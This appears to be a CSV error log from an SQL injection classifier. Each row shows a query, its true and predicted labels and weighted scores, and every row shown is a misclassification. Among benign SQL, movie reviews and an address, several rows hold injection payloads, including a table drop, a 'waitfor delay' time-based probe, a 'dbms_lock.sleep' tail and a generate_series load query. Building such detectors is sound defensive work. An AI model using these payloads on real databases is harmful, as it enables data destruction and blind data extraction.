query,true_label,predicted_label,reason
EXECUTE DBMS_ADVISOR.CREATE_SQLWKLD(:name),0,1,"Weighted scores: {0: 2.0000, 1: 3.0000}"
"SELECT EMPNUM FROM VWEN4501 WHERE COUNTRY IN (SELECT COUNTRY FROM VWEN4501 V1 WHERE TOTSAL > 8000 AND V1.HIREAGE IN (SELECT MAX(HIREAGE) FROM VWEN4501 V2 WHERE V2.TOTSAL IS NOT NULL AND EMPNUM < 2000 GROUP BY HIREAGE HAVING COUNT(*) IN (2,3))) AND EMPNUM BETWEEN 2000 AND 3000 UNION ALL SELECT SERIALNO FROM VWEN4502 WHERE SERIALNO BETWEEN 2000 AND 3000 AND EMPLENGTH < ALL (SELECT V2.EMPLENGTH FROM VWEN4502 V2 WHERE EMPLENGTH BETWEEN 4000 AND 5000) UNION ALL SELECT SERIALNO FROM VWEN4502 WHERE EMPLENGTH *3 < (MONTHSAL/100) + EMPLENGTH AND EMPLENGTH BETWEEN 3000 AND 4000 ORDER BY 1",0,1,"Weighted scores: {0: 0.0000, 1: 5.0005}"
; drop table temp --,1,0,"Weighted scores: {0: 5.0004, 1: 0.0000}"
"4ap8 hsfiq9voiqsd51ffb59154p2687tbkg70ghqsm n2tlqzwpl2ppk1 hnd1 4gy3oq8xdt7zvzw0neu1ced3j24o0fm26ky6k4sudp kx9aixh9a6hwdzob9t8cn5ytues09w hoxhgc6dwdt0qgxozirw382qfj33dzurzjwaolm7xrdsllst9565r06645megh033l07zy s629nf7wk01o109fgelao h5ahr8qcea9xj 9rryi4494zrv7pkgkyigtuv9jbeb2rw3ggd81jn v22lcw91tleo k7jeqjbtty8jlqe6u6uralzsiz085wvtwvjoo6c53la842b2kq5t30z ut qk2zvsx xku8bxubquv4mw4kiufi23h8swcmpem5166kuesgqtzy26l6ngss8icw3eygz v5usff8o1hqa6myq0c3gwpdv ist25jiypxhqaoib2asdjyifphu3xah7t04fotemk1se9i8i pfuu90hdpm4j0cqm6 1hkzkpwo3kjh5rqrhf7mcrnku owxzma61ehlws6hnecgc9cwli4hcsw54qg25ek67t2ob 60i647xn7eyrqwbblfa2jcdmqccgjkeihmwc7e3wofn3cll5bauv2vsnkmzgfk62qmazbqx7mxbi3c7lm1q98172ddzobcga8k3 nqiowuw17jpst37yk95uetbxritigtb74b9af1d1cs1fee b9x1o14ln4rq8ugooos50o6wm9soa nvnn9w0nty3fba1yy7yh3ictz1vnq8wdw6hcb5red9edr7ff7p3ykal70krwmttu qoboomuh6bn947j9xf8a8z7ubgd2bp862e4qny4vivinqxk7wb fd0dqvnj3ezvf7sq5sauo0s6xwverhphdex0y6cmx4 r44tm3n0mj0u8d3t1%"" ) waitfor delay '0:0:5'--",1,0,"Weighted scores: {0: 5.0077, 1: 0.0000}"
EXECUTE :workload_name := 'MY_CACHE_WORKLOAD',0,1,"Weighted scores: {0: 0.0000, 1: 5.0193}"
"SELECT virtualtransaction AS vxid, transactionid::text FROM pg_locks WHERE pid = pg_backend_pid() ORDER BY 1, 2 LIMIT 1",0,1,"Weighted scores: {0: 0.0000, 1: 5.0013}"
"Oh god, what a horrible, horrible film. Meant to be a comment on the state of society, it's just a reflection of the worst of the worst in reality TV. Interstitials hosted by Jason Jones and Don McKellar are the most obnoxious part, written in a tone that is perhaps meant to be reflexive and insightful. Rather, these moments are mind numbing as they speak to the camera with dialogue written by someone with a love for insulting, condescending speech that shoves the ""meaning"" of the film down the viewer's throat.<br /><br />Also, a point to would-be filmmakers: Long takes and quiet scenes do not equal art. Neither do extreme angles or logic stretched to the point of absurdity.<br /><br />If anyone out there is interested in watching this film, please don't. Seriously. Please. You have better things to do.' else dbms_lock.sleep ( 0 )",1,0,"Weighted scores: {0: 5.0022, 1: 0.0000}"
VARIABLE no_recs NUMBER,0,1,"Weighted scores: {0: 1.0001, 1: 4.0000}"
"SELECT x.country, count(*) FROM Company x, Product y WHERE x.cname = y.manufacturer GROUP BY x.country;",0,1,"Weighted scores: {0: 2.0003, 1: 3.0006}"
SELECT COUNT(*) FROM VWIPR301 WHERE INTEGER((((((SMINT*2)/2)*10)/10)*99.3)/99.3) > (SELECT (((((((COUNT(DISTINCT NUMERIC83NN*2)/2)*10)/10) *99)/99)/13)*13) FROM TBIPR302 WHERE CHARNN < 'CHARNN' ),0,1,"Weighted scores: {0: 2.0001, 1: 3.0004}"
"EXPLAIN SELECT TYPE, (SELECT VALUE FROM TEST T2 WHERE T.TYPE = T2.TYPE ORDER BY TYPE, VALUE LIMIT 1) MIN FROM (SELECT DISTINCT TYPE FROM TEST) T ORDER BY TYPE",0,1,"Weighted scores: {0: 1.0040, 1: 4.0135}"
calle la salina 7 1?b,0,1,"Weighted scores: {0: 1.0005, 1: 4.0022}"
SELECT pg_sleep(0.300),0,1,"Weighted scores: {0: 1.0003, 1: 4.0059}"
"1;select count(*) from generate_series(1,5000000)--",1,0,"Weighted scores: {0: 5.0014, 1: 0.0000}"
"INSERT INTO TEST SELECT X FROM SYSTEM_RANGE(1, 1000)",0,1,"Weighted scores: {0: 0.0000, 1: 5.0012}"
"SELECT COALESCE(#T2.SNO,#T1.SNO) AS SNO, COALESCE(Shipping,0) + COALESCE(Used,0) AS Total FROM #T1 FULL OUTER JOIN #T2 ON #T1.SNO = #T2.SNO",0,1,"Weighted scores: {0: 0.0000, 1: 5.0019}"
"This is the best comedy period. It is so underrated! Clever witty humor, Great casting! Jerry Stiller is the jewel in the show, he is so incredibly funny and quirky, simply a comical genius! Doug and Carrie have great chemistry! I so do not see what the hype is about when it comes to Everybody loves Raymond it is SO overrated with lame jokes mostly forced humor and just not the witty show, I can't remember laughing in more than 1 episode. King of Queens is a rare comedy that has all the right ingredients to give you serious belly laughs which is normally caused by Arthur Spooner, I think its about time this comedy gets the hype it deserves and not the lame Raymond & CO.",0,1,"Weighted scores: {0: 0.0000, 1: 5.0014}"
"I'm easily entertained. I enjoyed """,0,1,"Weighted scores: {0: 0.0000, 1: 5.0103}"
